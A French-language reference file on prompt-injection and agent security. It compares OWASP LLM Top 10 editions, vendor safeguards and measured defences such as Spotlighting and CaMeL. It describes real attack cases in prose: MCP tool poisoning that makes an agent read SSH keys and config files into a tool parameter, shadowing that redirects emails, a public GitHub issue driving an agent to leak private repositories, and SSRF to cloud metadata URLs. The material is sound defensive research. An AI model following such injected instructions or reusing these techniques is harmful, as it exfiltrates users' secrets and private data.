# Sécurité du prompting : prompt injection, agent security, et ce qui est réellement mesuré

> **Base de référence embarquée dans le plugin prompts.** Pages consultées le **2026-11-09** ; à relire avant le **2027-02-09**. Un fait propre à un modèle (effort, thinking, paramètres, formulations) se relit sur la page officielle du modèle visé avant d'être affirmé : ce fichier dit où lire, pas ce qui est vrai aujourd'hui. Les renvois `→ NN` désignent les autres fichiers de ce dossier (même préfixe numérique) ; les notes de recherche citées ne sont pas publiées.


**Notes lues pour ce fichier** : `research_notes/Prompt engineering référence 2026/06-securite-injection.md`, lue **intégralement jusqu'à la fin** (Q1 à Q6, sections Takeaway / Cited Findings / Inferences / Gaps). **Date de rédaction et de consultation de toutes les sources : 2026-11-09.**

**Convention de preuve** (reprise de la note, skill `verifier-a-la-source`) — chaque affirmation porte son URL, sa date de consultation et la version ou la génération à laquelle elle s'applique. Citations ≤ 15 mots. Trois étiquettes strictement séparées, jamais promues :

| Étiquette | Sens |
|---|---|
| **[MESURÉ]** | chiffre issu d'une évaluation publiée, **lue à la source** |
| **[RECOMMANDÉ]** | prescription d'un standard ou d'un vendor, **sans mesure publiée dans la source lue** |
| **[PRATICIEN]** | analyse d'un praticien, ni standard ni documentation vendor |

**Avertissement injection** : aucune page lue par la recherche ne contenait d'instruction visant l'agent. Tout contenu web cité ci-dessous est traité comme de la **donnée**.

---

## Résultat central, à lire avant tout le reste

**De toutes les défenses qui circulent contre la prompt injection, seules deux familles disposent d'une mesure publiée lue à la source.** Tout le reste — y compris les prescriptions des standards eux-mêmes — est **recommandé sans mesure**.

| Ce qui est mesuré | Chiffre | Source lue |
|---|---|---|
| **Spotlighting** (séparation instruction/donnée par signal de provenance) | ASR des indirect injections **> 50 % → < 2 %**, famille **GPT**, impact minimal sur la tâche | arXiv 2403.14720, v1 soumis 2024-03-20 (consulté 2026-11-09) |
| **CaMeL** (flux de contrôle et de données extraits de la requête de confiance + capabilities) | **77 %** des tâches AgentDojo résolues **avec sécurité prouvable**, contre **84 %** sans défense — coût : **7 points d'utilité** | arXiv 2503.18813, v1 2025-03-24 / v2 2025-06-24 (consulté 2026-11-09) |
| **Robustesse vendor du modèle seul** (ChatGPT agent) | **99,5 % / 95 % / 78 % / 67 %** selon type d'attaque et navigateur | ChatGPT agent system card (consulté 2026-11-09) |

**Et ce qui ne l'est pas.** Aucun chiffre d'efficacité n'accompagne, dans les pages lues :
- les **sept stratégies d'OWASP LLM01:2025** — [RECOMMANDÉ] ;
- les **cinq couches de Google** — [RECOMMANDÉ], aucune mesure publiée ;
- les **safeguards d'Anthropic** (permissions, fail-closed matching, sandbox, résumé de page) — [RECOMMANDÉ], aucune mesure publiée dans la page sécurité consultée ;
- les obligations **MUST** du spec MCP (scopes, consentement, tokens, sessions) — [RECOMMANDÉ, niveau normatif], aucune mesure ;
- les **délimiteurs**, les **guardrail/classifier models**, le **least privilege**, le **tool pinning**, la **sandbox** — [RECOMMANDÉ].

C'est le résultat inconfortable de ce dossier : **le registre uniforme des quatre documents officiels lus est celui du coût d'attaque et des couches, pas de la solution.** Aucun ne revendique une défense complète.

---

## 1. Le standard : OWASP Top 10 for LLM Applications — deux éditions coexistent

> **Correction du 2026-11-09, après contre-vérification du coordinateur.** Ce fichier
> affirmait d'abord que l'édition **2025** était « toujours la courante » et qu'« aucune
> édition 2026 n'apparaît ». C'était une **conclusion d'absence tirée d'une seule page** :
> la page de liste 2025 n'annonce effectivement rien, mais la page d'accueil de l'éditeur,
> elle, annonce une **édition 2026**. L'affirmation a été remplacée par la contradiction
> réelle, avec ses deux sources. Le défaut de méthode est consigné parce qu'il est
> instructif : *ne pas trouver X sur la page où on l'attend ne prouve pas que X n'existe pas.*

**[RECOMMANDÉ]** — Les deux éditions sont publiées par l'**OWASP Foundation** dans le cadre de l'**OWASP GenAI Security Project**. Au 2026-11-09, **les pages de l'éditeur se contredisent sur laquelle est courante** — contradiction rapportée, non arbitrée :

| Ce que dit la source | Source (URL, date de consultation) | Citation (≤15 mots) |
|---|---|---|
| Le 2026 est la dernière édition | [genai.owasp.org/resource/owasp-genai-llm-top-10-2026/](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) (2026-11-09, date affichée « August 3, 2026 ») | « OWASP Top 10 for LLM Applications 2026 is the latest community-driven guide » |
| La navigation de l'éditeur libelle toujours 2025 comme l'entrée courante, et **aucun lien de navigation ne mène à une liste 2026** | [genai.owasp.org](https://genai.owasp.org) (2026-11-09) | libellé de navigation « LLM TOP 10 FOR 2025 » |
| La page projet OWASP fait pointer « la dernière » vers **la liste 2025** | [owasp.org/www-project-top-10-for-large-language-model-applications/](https://owasp.org/www-project-top-10-for-large-language-model-applications/) (2026-11-09) | « Access the latest Top 10 for LLM: » → `/llm-top-10/` (2025) |
| La page de liste 2025 ne porte **aucun avis** de supersession ni d'archivage | [genai.owasp.org/llm-top-10/](https://genai.owasp.org/llm-top-10/) (2026-11-09) | « Copyright © 2025 OWASP Foundation, Inc. » |

Mention de copyright lue sur la liste 2025 : « Copyright © 2025 OWASP Foundation, Inc. ». Traductions datées sur cette même page : **12 mars 2025** et **22 juillet 2025**.

### Les dix entrées, identifiants verbatim — édition 2025

| Identifiant verbatim |
|---|
| `LLM01:2025 Prompt Injection` |
| `LLM02:2025 Sensitive Information Disclosure` |
| `LLM03:2025 Supply Chain` |
| `LLM04:2025 Data and Model Poisoning` |
| `LLM05:2025 Improper Output Handling` |
| `LLM06:2025 Excessive Agency` |
| `LLM07:2025 System Prompt Leakage` |
| `LLM08:2025 Vector and Embedding Weaknesses` |
| `LLM09:2025 Misinformation` |
| `LLM10:2025 Unbounded Consumption` |

Source unique pour les dix : [genai.owasp.org/llm-top-10/](https://genai.owasp.org/llm-top-10/) (2026-11-09, édition 2025).

### Les dix entrées, identifiants verbatim — édition 2026

Lues dans le **PDF** de l'édition 2026 (sommaire p. 3, recoupé avec les titres de section du corps à partir de p. 10). **Aucune page HTML de l'éditeur ne porte ces dix entrées** : la page de ressource ne les liste pas, et `genai.owasp.org/llm-top-10-2026/` a répondu **HTTP 404** le 2026-11-09.

| Identifiant verbatim 2026 | Rang en 2025 |
|---|---|
| `LLM01:2026 Prompt Injection` | 1 — inchangé |
| `LLM02:2026 Sensitive Information Disclosure` | 2 — inchangé |
| `LLM03:2026 Excessive Agency` | 6 → 3 |
| `LLM04:2026 Supply Chain` | 3 → 4 |
| `LLM05:2026 Data and Model Poisoning` | 4 → 5 |
| `LLM06:2026 Unbounded Consumption` | 10 → 6 |
| `LLM07:2026 Misinformation` | 9 → 7 |
| `LLM08:2026 Hidden Context Exposure` | **absente de la liste 2025** — correspondance avec `LLM07:2025 System Prompt Leakage` (elle-même absente de la liste 2026) **non lue : à vérifier** (figure 1, p. 6) |
| `LLM09:2026 Vector and Embedding Weaknesses` | 8 → 9 |
| `LLM10:2026 Improper Output Handling` | 5 → 10 |

Source : PDF obtenu depuis [genai.owasp.org/resource/owasp-genai-llm-top-10-2026/](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) (consulté 2026-11-09 ; l'URL de téléchargement porte un paramètre probablement éphémère). Le document se nomme lui-même « Version 2026 ». La correspondance de rang ci-dessus s'appuie sur la légende de sa figure 1, p. 6 : « Rank migration from the 2025 to the final 2026 OWASP GenAI/LLM Top 10 » — **le détail ligne par ligne du graphique n'a pas été lu**, les rangs 2025 sont repris du tableau 2025 ci-dessus.

**Ce qui change pour LLM01 en 2026** — le périmètre s'élargit, verbatim du PDF (p. 7) : « Prompt Injection now covers cross-modal attacks, the kind that hide instructions inside an image ». La description (p. 10) vise désormais l'entrée qu'elle vienne de l'utilisateur, de contenu récupéré, de **sortie d'outil**, d'image, d'audio, de vidéo, du raisonnement intermédiaire ou de la **mémoire persistante**. Le rang 1 est explicitement un choix de vote et d'effet de défense, pas de volume d'incidents : les leads écrivent que classé sur le registre brut d'incidents, « it falls out of the top 10 entirely », et qu'il reste malgré tout premier.

> **Gaps assumés — à vérifier.**
> - **La date de publication de l'édition 2026 n'est pas établie.** Trois dates coexistent sans être réconciliées : « August 3, 2026 » (page de ressource), « August 4th, 2026 » sur la couverture du PDF — **qui porte en même temps le gabarit non rempli « [Publication date to be set] »** — et « September 1, 2026 » / « Sept. 2, 2026 » (article d'annonce). L'historique de révision du PDF porte lui aussi un gabarit : « [2026 release date] Version 2026 Release ». La mention « v1.0 » qui circule vient du **nom de fichier** d'une image d'en-tête, pas du texte d'une page.
> - **Aucune phrase de supersession n'existe.** Recherche sur tout le PDF (`supersed`, `replaces`, `retire`, `archiv`, `no longer`, `deprecat`) : aucune occurrence portant sur l'édition 2025. Le statut formel du 2025 n'est donc **pas** établi — ni courant, ni retiré.
> - Au-delà de la page 12, le PDF 2026 n'a été que **grepé**, pas lu. Les contenus par entrée (hors LLM01) ne sont pas sourcés ici.
> - La **date de publication exacte du document anglais 2025** n'est affichée ni sur la page de liste ni sur la page projet ; sa page de ressource a répondu **404** le 2026-11-09.
> - **Tout le reste de ce fichier a été établi contre l'édition 2025.** Les sept stratégies de LLM01, les définitions direct/indirect et les prescriptions citées plus bas viennent de pages `:2025`. Elles ne sont **pas** re-vérifiées contre le texte 2026 : à refaire avant de s'appuyer sur ce fichier pour un audit de conformité.

### Agent Control Standard — nouveau, non couvert ici

L'éditeur publie aussi un **Agent Control Standard (ACS)**, « Now part of the OWASP GenAI Security Project », présenté comme « the open foundation for putting these principles into practice » (les principes étant que les agents soient inspectables, traçables et instrumentables) — [genai.owasp.org/resource/agent-control-standard-acs/](https://genai.owasp.org/resource/agent-control-standard-acs/) (2026-11-09, date affichée « September 1, 2026 » ; numéro de version non affiché sur la page lue). **Son contenu n'a pas été lu** : à vérifier, et probablement la source la plus pertinente pour la sécurité des agents, sujet que ce fichier ne traite qu'à travers le Top 10 et la spec MCP.

### Pour un data/AI engineer

La chaîne réelle d'un incident, telle qu'elle ressort des entrées : **LLM01** fournit l'instruction, **LLM05 (Improper Output Handling)** la rend exécutable, **LLM06 (Excessive Agency)** lui donne un effet.

---

## 2. Direct vs indirect : les définitions canoniques

**[RECOMMANDÉ]** — Source : [genai.owasp.org/llmrisk/llm01-prompt-injection/](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) (2026-11-09, LLM01:2025).

| | Définition lue |
|---|---|
| **Direct prompt injection** | L'entrée de l'utilisateur lui-même modifie le comportement du modèle de façon non prévue — intentionnellement ou accidentellement. |
| **Indirect prompt injection** | Le modèle ingère du **contenu externe** (sites, fichiers) qui contient des instructions altérant son comportement. |

Formulation Google, pour l'indirect : des « hidden malicious instructions within external data sources » — [blog.google/security/mitigating-prompt-injection-attacks/](https://blog.google/security/mitigating-prompt-injection-attacks/) (2026-11-09, billet du 13 juin 2025). **[RECOMMANDÉ]**

### Les sept stratégies de LLM01:2025 — [RECOMMANDÉ], sans aucun chiffre

Paraphrasées ; texte intégral à l'URL ci-dessus (2026-11-09) :

1. **Contraindre le comportement du modèle** — rôle, capacités et limites dans le system prompt ; lui demander d'ignorer les tentatives de surcharge de ses instructions.
2. **Définir et valider les formats de sortie** — exiger raisonnement et citations de sources, vérifier la conformité par du **code déterministe**.
3. **Filtrer entrées et sorties** — catégories de contenu sensible, contrôles sémantiques et par chaînes, évaluation par la « RAG Triad » (context relevance, groundedness, question/answer relevance).
4. **Least privilege** — jetons API propres à l'application, fonctions étendues traitées **en code** plutôt qu'exposées au modèle.
5. **Approbation humaine** pour les actions privilégiées (human-in-the-loop).
6. **Ségréguer et étiqueter le contenu externe** pour qu'il pèse moins que le prompt utilisateur.
7. **Tests adversariaux réguliers**, en traitant le modèle comme un utilisateur non fiable.

**Lecture structurelle** (inférence de la note, non mesurée) : deux de ces sept — **least privilege** et **approbation humaine** — sont des contrôles d'architecture dont l'effet **ne dépend pas de la docilité du modèle**. Les cinq autres (system prompt défensif, délimitation, filtrage) en dépendent, et sont donc structurellement contournables.

---

## 3. Les patterns documentés dans le monde réel

L'étiquette est ici le **type de source** : enregistrement CVE, billet vendor/labo, ou spécification. Aucun de ces patterns n'est accompagné d'une mesure d'incidence.

### 3.1 — EchoLeak / M365 Copilot : le seul avec un CVE

**CVE-2025-32711** — enregistrement lu à la source : [cveawg.mitre.org/api/cve/CVE-2025-32711](https://cveawg.mitre.org/api/cve/CVE-2025-32711) (2026-11-09).

| Champ | Valeur lue |
|---|---|
| Titre officiel | « M365 Copilot Information Disclosure Vulnerability » |
| Description Microsoft | faille d'**AI command injection** dans M365 Copilot, permettant à un attaquant **non autorisé** de divulguer de l'information via le réseau |
| CVSS 3.1 | **9.3 (Critical)** |
| Vecteur | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N/E:U/RL:O/RC:C` — noter **`UI:N`** (aucune interaction utilisateur, d'où « zero-click ») et **`S:C`** (changement de scope) |
| CWE | **CWE-74** (Improper Neutralization of Special Elements in Output Used by a Downstream Component) |
| Assigner | Microsoft |
| Dates | réservé **2025-04-09**, **publié 2025-06-11**, enregistrement mis à jour **2026-11-03** |
| Produit affecté | Microsoft 365 Copilot, **toutes versions**, sans intervalle précisé |

> **À vérifier — ne pas publier.** L'attribution à **Aim Security** et le **mécanisme technique précis** (« LLM Scope Violation », exfiltration par image markdown, contournement CSP via domaines Teams/SharePoint, correctif côté serveur) **n'ont pas été lus à la source** : `aim.security` et `thehackernews.com` ont renvoyé **HTTP 403** le 2026-11-09, `nvd.nist.gov` n'a servi que sa page d'accueil. Seules les données de l'enregistrement CVE ci-dessus sont sourcées.

### 3.2 — MCP : tool poisoning, rug pull, shadowing

Source : Invariant Labs, billet du **1er avril 2025** (mises à jour 7 et 11 avril 2025) — [invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) (2026-11-09).

| Pattern | Ce que dit la source lue |
|---|---|
| **Tool poisoning** | Instructions malveillantes placées dans les **descriptions de tools MCP**, « invisible to users but visible to AI models ». L'utilisateur voit une vue simplifiée du tool ; le modèle lit la description complète. |
| **Démo** | Un tool `add` empoisonné, agent **Cursor** : les instructions cachées lui font lire `~/.cursor/mcp.json` et `~/.ssh/id_rsa` et en passer le contenu via le paramètre `sidenote`. Cursor affichait un dialogue de confirmation, **sans montrer l'input complet du tool** — la clé SSH restait masquée. |
| **Rug pull** | « a malicious server can change the tool description after the client has already approved it ». |
| **Shadowing** | Un serveur malveillant modifie la façon dont l'agent utilise un tool **de confiance** : la description d'un faux tool `add` redirige tous les `send_email` vers l'adresse de l'attaquant, même quand l'utilisateur nomme un autre destinataire. Conclusion des auteurs : « Shadowing Is Enough » — et cela peut se produire **sans que le serveur malveillant apparaisse dans le log visible**. |

**Mitigations proposées par Invariant — [RECOMMANDÉ]** : (a) patterns UI clairs, montrer les descriptions complètes et distinguer le texte vu par l'utilisateur de celui vu par l'IA ; (b) **tool/package pinning** — vérification des descriptions par hash/checksum ; (c) frontières et contrôles de flux de données plus stricts **entre serveurs MCP**.

### 3.3 — Serveur officiel détourné par du contenu public : « toxic agent flow » (GitHub MCP)

Source : Invariant Labs, billet du **26 mai 2025** — [invariantlabs.ai/blog/mcp-github-vulnerability](https://invariantlabs.ai/blog/mcp-github-vulnerability) (2026-11-09).

Le déroulé lu : l'attaquant dépose sur un dépôt **public** une issue malveillante contenant une prompt injection (geste permis à tous) ; la victime demande à son agent de passer en revue les issues ouvertes — requête bénigne ; l'agent suit les instructions injectées, tire des données des **dépôts privés** de l'utilisateur dans son contexte, puis les publie dans une **pull request créée de façon autonome** sur le dépôt public, où l'attaquant les lit. **Aucun tool compromis n'est nécessaire** ; le billet qualifie le défaut d'**architectural** plutôt que de bug du code du serveur GitHub.

Deux constats de la même source, importants pour un gate d'approbation : Claude Desktop demandait confirmation à chaque tool call, mais beaucoup d'utilisateurs choisissent **« Always Allow »**, ce qui masque les actions malveillantes ; et **l'alignement du modèle seul est insuffisant** — Claude 4 Opus restait susceptible —, d'où la conclusion que la sécurité doit être imposée **au niveau système**. Mitigations proposées **[RECOMMANDÉ]** : permissions granulaires au runtime (p. ex. une seule repo par session), les permissions de token traditionnelles étant jugées trop rigides ; monitoring continu du trafic agent→MCP (proxy MCP-scan).

### 3.4 — Vecteurs structurels nommés par le spec MCP

Source : [modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) (consulté 2026-11-09 ; **le contenu servi réfère la révision 2025-11-25**).

> **Révision — à lire avant de reciter ce §3.4 et le §4.4.** Vérifié à la source le 09/11/2026 :
> **`2025-11-25` n'est pas la révision courante** d'après les deux pages lues ce jour-là,
> [https://modelcontextprotocol.io/specification/versioning](https://modelcontextprotocol.io/specification/versioning)
> — « The current protocol version is 2026-07-28 » — et
> [https://modelcontextprotocol.io/specification/](https://modelcontextprotocol.io/specification/),
> qui pointe `schema/2026-07-28/schema.ts`. Ce que cela change, et ce que cela ne change pas : **cinq**
> des vecteurs du tableau ci-dessous se retrouvent **nommés à l'identique** sur
> `/specification/2026-07-28/basic/security_best_practices`, page lue et citée en `03 §7` — *confused
> deputy*, *token passthrough*, SSRF, compromission d'un serveur MCP local, minimisation des scopes :
> ceux-là ne sont **pas** périmés. **Le sixième ne se recoupe pas par son nom** : ce tableau cite
> « *session hijack* » et « MCP Servers **MUST NOT** use **sessions** for authentication », là où la
> page `2026-07-28` cite « *state handle hijacking* » et « MUST NOT treat possession of a **state
> handle** as authentication ». Un renommage est plausible ; **ce n'est pas lu, donc : correspondance
> non lue, à vérifier** — c'est précisément la déduction par élimination que cette base s'interdit
> (`README §4.1`). Réserve de portée : ces deux listes sont comparées **depuis les deux fichiers de
> cette base**, aucune des deux pages de la spec n'ayant été relue à cette occasion. Mais une citation doit voyager avec
> sa révision : **citer la page `2026-07-28`**, pas celle-ci. Ce que la page de versioning **ne dit
> pas** : elle ne liste aucune révision et ne donne **aucun statut** à `2025-11-25` — elle ne la
> nomme que comme révision « handshake-based … and earlier ». `2025-11-25` est donc établie comme
> **non courante**, et non comme obsolète : la différence n'a pas été lue.

| Vecteur | Ce que dit la source lue |
|---|---|
| **SSRF via serveur MCP malveillant** | Un serveur malveillant peut peupler les URLs de découverte OAuth avec des cibles internes — `http://169.254.169.254/` (metadata cloud), `http://localhost:6379/`, DNS rebinding, chaînes de redirections — pour exfiltrer des credentials cloud. Le client MCP sert alors de proxy et **contourne le périmètre réseau**. |
| **Session hijack prompt injection** | Avec plusieurs serveurs HTTP stateful, un attaquant qui obtient ou devine un session ID peut injecter un événement malveillant sur le serveur B ; le serveur A le dépile et le renvoie au client comme réponse asynchrone, que le client exécute. |
| Autres sujets couverts | confused deputy, token passthrough, compromission de serveur MCP **local**, validation des URLs d'autorisation OAuth, sécurité du transport stdio en scénario proxy, scope minimization. |

**Le pattern commun aux quatre familles** (tool poisoning, rug pull, shadowing, contenu public ingéré) est l'**asymétrie de visibilité** : ce que le modèle lit n'est pas ce que l'humain approuve. Un gate d'approbation qui n'affiche pas l'intégralité de l'entrée réellement transmise ne protège de rien — c'est exactement l'échec observé dans la démo Cursor. Corollaire : une `description` de tool doit être traitée comme du **contenu non fiable**, à épingler et versionner au même titre qu'une dépendance logicielle. *(Inférence de la note, non mesurée.)*

---

## 4. Ce que les vendors disent officiellement

### 4.1 — Anthropic : l'irrésolution écrite dans la documentation produit

Source : [code.claude.com/docs/en/security](https://code.claude.com/docs/en/security) (2026-11-09, docs **Claude Code**).

Anthropic définit la prompt injection comme une technique où un attaquant tente de surcharger ou manipuler les instructions de l'assistant en insérant du texte malveillant, et énumère « several safeguards ».

> **Énoncé d'irrésolution, verbatim :** « no system is completely immune to all attacks ».
> La phrase complète est présentée comme un avertissement encadré : les protections réduisent significativement le risque, **mais pas à zéro**.

**Anthropic est le seul des trois vendors à écrire l'énoncé d'irrésolution dans sa documentation produit** — et non dans un billet de blog ou une system card. C'est la citation la plus solide à utiliser dans un document interne.

Safeguards officiels **[RECOMMANDÉ]**, aucune mesure publiée dans la page lue : système de permissions (mode Manual → approbation explicite pour les opérations sensibles) ; **commandes réseau non auto-approuvées** par défaut (`curl`, `wget`) ; `permissions.deny` ; isolation réseau par sandbox ; **résumé de page web** — « WebFetch runs a separate model call over the page », Claude recevant la réponse de cet appel plutôt que la page brute ; détection d'injection de commande ; **fail-closed matching** (toute commande non reconnue exige approbation) ; frontière de répertoire de travail ; sandbox bash (isolation filesystem + réseau).

Bonnes pratiques face au contenu non fiable **[RECOMMANDÉ]** : relire les commandes avant approbation ; **« Avoid piping untrusted content directly to Claude »** ; vérifier les modifications de fichiers critiques ; exécuter scripts et tool calls dans des VMs, surtout en interaction avec des services web externes.

Position MCP : écrire ses propres serveurs ou n'utiliser que des fournisseurs de confiance ; Anthropic revoit les connecteurs selon ses critères de listing mais **« does not security-audit or manage any MCP server »**.

### 4.2 — OpenAI : des chiffres, et un caveat qui les limite

Source : [deploymentsafety.openai.com/chatgpt-agent/promptinjection](https://deploymentsafety.openai.com/chatgpt-agent/promptinjection) (2026-11-09, **ChatGPT agent system card**).

**[MESURÉ]** — Robustesse prompt-injection, **safety training seul** (Table 12) :

| Scénario | ChatGPT agent | Operator 4o | o3 |
|---|---|---|---|
| Instructions non pertinentes, navigateur **texte** (exemples qualifiés de **synthétiques** par OpenAI) | **99,5 %** | — | — |
| Instructions non pertinentes, navigateur **visuel** | **95 %** | 82 % | 89 % |
| **In-context data exfiltration**, navigateur visuel | **78 %** | 75 % | 80 % |
| **Active data exfiltration**, navigateur visuel | **67 %** | 58 % | 75 % |

**[MESURÉ]** — Confirmations (Table 13) : *confirmation recall* **91,0 %** (OpenAI précise que c'est **probablement une sous-estimation**, beaucoup d'échecs étant des faux négatifs) ; *critical confirmation recall* **100 %** pour l'édition de permissions et les transactions financières, **99,9 %** pour les communications à fort enjeu ; partage accidentel de données sensibles : **8 tests manuels sur 8** réussis.

> **Caveat majeur, verbatim** : ces résultats « test only the model's behavior, not our full end-to-end stack » ; et les mesures listées sont « some, but not all » des mitigations.

OpenAI note aussi que l'impact « could be higher than for previous launches » parce que l'agent dispose de **plus de tools simultanément**.

Mitigations OpenAI **[RECOMMANDÉ]** : entraînement spécialisé à la robustesse prompt-injection ; monitors et filtres automatisés, actualisables rapidement ; confirmations utilisateur avant certaines actions en ligne ; **Watch Mode** (pause quand l'utilisateur devient inactif ou quitte la conversation) ; restrictions réseau du terminal (essentiellement requêtes GET d'images ou de datasets) ; mémoire ChatGPT désactivée au lancement ; red teaming cybersécurité externe.

> **Énoncé d'irrésolution OpenAI — qualification à conserver.** OpenAI qualifie les garanties de sécurité déterministes de **« challenging »** pour la prompt injection, se dit **« optimistic »** que détection rapide et contre-mesures réduisent significativement le risque réel au fil du temps, et compare le problème aux « scams and social engineering on the web ». **Ces formules sont rapportées et citées de seconde main** par [the-decoder.com, 23 décembre 2025](https://the-decoder.com/openai-admits-prompt-injection-may-never-be-fully-solved-casting-doubt-on-the-agentic-ai-vision/) (2026-11-09). **La formule « may never be fully solved » est la synthèse du journaliste, pas une citation d'OpenAI** — distinction à conserver. Les sources primaires OpenAI (`openai.com/safety/prompt-injections/`, `openai.com/index/hardening-atlas-against-prompt-injection/`, `openai.com/index/continuously-hardening-chatgpt-atlas-against-prompt-injection-attacks/`, `help.openai.com/...`) ont toutes renvoyé **HTTP 403** le 2026-11-09 : **à revérifier à la source avant toute publication externe.**

### 4.3 — Google : relever le coût de l'attaque, sans trancher la question

Source : [blog.google/security/mitigating-prompt-injection-attacks/](https://blog.google/security/mitigating-prompt-injection-attacks/) (2026-11-09, billet officiel du **13 juin 2025**, Google GenAI Security Team).

Approche décrite comme « a layered security approach », dont le but est de rendre les attaques plus difficiles et plus coûteuses — « meaningfully elevating the difficulty, expense, and complexity faced by an attacker ».

Les cinq couches **[RECOMMANDÉ]** : classifieurs de contenu prompt-injection ; **security thought reinforcement** ; sanitisation markdown et **redaction d'URLs suspectes** ; framework de confirmation utilisateur ; notifications de sécurité à l'utilisateur final.

Le billet **ne déclare pas** la prompt injection soluble ou insoluble ; il présente ses défenses comme relevant la barre, et annonce des travaux pour rendre les modèles « inherently more resilient ». **Aucune mesure d'efficacité de ces cinq couches n'est publiée dans la source lue — à étiqueter [RECOMMANDÉ], jamais [MESURÉ].**

### 4.4 — Spécification MCP : les obligations normatives

Source : [modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) (2026-11-09, révision servie **2025-11-25**).

**[RECOMMANDÉ, niveau MUST]** :
- « MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server » ;
- « MCP Servers **MUST NOT** use sessions for authentication » ;
- session IDs sécurisés et non déterministes, liés à une information propre à l'utilisateur (format `<user_id>:<session_id>`) ;
- consentement par client stocké et vérifié **avant** le flow tiers ;
- validation **exacte** du `redirect_uri` (string matching, **pas de wildcard**) ;
- `state` à usage unique, posé **après** approbation du consentement ;
- consentement avant exécution d'un serveur local : afficher la commande exacte **« without truncation »**, l'identifier comme opération potentiellement dangereuse, exiger une approbation explicite. **SHOULD** : sandbox/containerisation, privilèges minimaux, avertir que le serveur tourne avec les privilèges du client.

**Scope minimization [RECOMMANDÉ]** : modèle de scope progressif et least-privilege — scope initial minimal (p. ex. `mcp:tools-basic`), élévation ciblée via challenge `WWW-Authenticate scope="..."`, tolérance au down-scoping. Erreurs nommées : publier tous les scopes dans `scopes_supported` ; scopes wildcard/omnibus (`*`, `all`, `full-access`) ; grouper des privilèges sans rapport pour éviter de futurs prompts. Risque nommé pour le token large : « stolen broad token enables unrelated tool/resource access ».

**Point de lecture** : le spec MCP ne traite **pas** la prompt injection comme un risque de premier plan avec sa propre section ; il traite les vecteurs qui en déterminent l'**impact** (scopes, consentement, SSRF, exécution locale). Pour un engineer : la conformité au spec MCP **réduit le rayon d'explosion, pas la probabilité d'injection**. *(Inférence de la note.)*

### 4.5 — Le cadrage praticien : « lethal trifecta »

**[PRATICIEN]** — Simon Willison, billet du **16 juin 2025** — [simonwillison.net/2025/Jun/16/the-lethal-trifecta/](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) (2026-11-09). **Ni doc vendor ni standard.**

Les trois composants : (1) accès à des **données privées** ; (2) exposition à du **contenu non fiable** — texte ou images qu'un attaquant peut contrôler et faire entrer dans le modèle ; (3) **capacité de communiquer vers l'extérieur** d'une manière qui peut faire fuiter les données.

- Thèse centrale : « LLMs are unable to reliably distinguish the importance of instructions based on where they came from ».
- Aveu d'irrésolution : « we still don't know how to 100% reliably prevent this from happening ».
- Sur les produits de guardrails : les offres qui prétendent bloquer ces attaques sont **non prouvées**, et un taux de succès annoncé de **95 % est une note d'échec** en sécurité web.
- Limite de responsabilité vendor : quand c'est l'utilisateur qui combine lui-même les trois capacités, « there's nothing those vendors can do to protect you! ».
- Le billet **ne dit pas** qui a inventé le terme en premier ; Willison en est l'auteur et le diffuseur.

> **Gap.** Aucune **mesure** n'est associée à la trifecta elle-même : c'est une **règle de conception, pas un résultat expérimental** — à étiqueter ainsi dans tout document. Son utilité est d'être un **critère de refus** applicable sans instrumentation.

Recoupement chiffré : le seuil « 95 % = échec » posé par Willison est **au-dessus** du **67 %** que publie OpenAI sur l'active data exfiltration en navigateur visuel.

---

## 5. Les défenses : table de décision

Étiquette = tier, tel qu'établi par la note. **Aucune promotion.** « Génération » = ce à quoi le chiffre ou la prescription s'applique.

| Défense | Étiquette | Chiffre | Coût / limite | Source lue (URL, date de consultation, génération) |
|---|---|---|---|---|
| **Spotlighting** (delimiting / provenance continue) | **[MESURÉ]** | ASR **> 50 % → < 2 %** | « impact minimal sur l'efficacité de la tâche » | [arxiv.org/abs/2403.14720](https://arxiv.org/abs/2403.14720) — 2026-11-09, v1 soumis 2024-03-20, **famille GPT** |
| **CaMeL** — « Defeating Prompt Injections by Design » | **[MESURÉ]** | **77 %** des tâches AgentDojo avec sécurité prouvable vs **84 %** non défendu | **−7 points d'utilité** ; exige une couche système autour du LLM | [arxiv.org/abs/2503.18813](https://arxiv.org/abs/2503.18813) — 2026-11-09, v1 2025-03-24 / v2 2025-06-24 |
| **Entraînement adversarial vendor** (ChatGPT agent) | **[MESURÉ]** | 99,5 % / 95 % / 78 % / **67 %** | **Mesure du modèle seul**, « not our full end-to-end stack » ; cas texte qualifiés de synthétiques | [deploymentsafety.openai.com](https://deploymentsafety.openai.com/chatgpt-agent/promptinjection) — 2026-11-09, ChatGPT agent |
| **Gate d'approbation humaine** | **[MESURÉ] pour le recall du gate, [RECOMMANDÉ] pour son effet sur l'injection** | recall **91,0 %** ; critical recall **100 %** (permissions, transactions financières) / **99,9 %** (communications à fort enjeu) | Ne protège pas si l'affichage tronque ; « Always Allow » le neutralise | [deploymentsafety.openai.com](https://deploymentsafety.openai.com/chatgpt-agent/promptinjection) ; OWASP LLM01 ; [blog.google](https://blog.google/security/mitigating-prompt-injection-attacks/) ; [code.claude.com/docs/en/security](https://code.claude.com/docs/en/security) — 2026-11-09 |
| **Délimitation / ségrégation du contenu externe** | **[RECOMMANDÉ]** | aucun | — | [OWASP LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) — 2026-11-09 |
| **Guardrail / classifier models** | **[RECOMMANDÉ]**, et **contesté** | aucun dans les trois sources officielles | Contesté : 95 % jugé insuffisant **[PRATICIEN]** | [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) ; [blog.google](https://blog.google/security/mitigating-prompt-injection-attacks/) ; [deploymentsafety.openai.com](https://deploymentsafety.openai.com/chatgpt-agent/promptinjection) ; contestation [simonwillison.net](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) — 2026-11-09 |
